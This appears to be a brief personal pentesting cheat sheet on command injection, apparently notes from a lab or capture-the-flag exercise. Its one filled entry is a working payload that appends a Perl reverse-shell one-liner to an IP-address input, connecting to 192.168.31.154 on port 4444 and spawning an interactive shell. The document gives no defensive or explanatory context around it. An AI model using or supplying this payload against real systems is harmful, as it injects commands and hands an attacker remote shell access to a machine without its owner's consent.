## Command Injection
#### Command
- ``
#### RevShell
- `127.0.0.1;perl -e 'use Socket;$i="192.168.31.154";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`
  - Reverse Shell Generator:perl
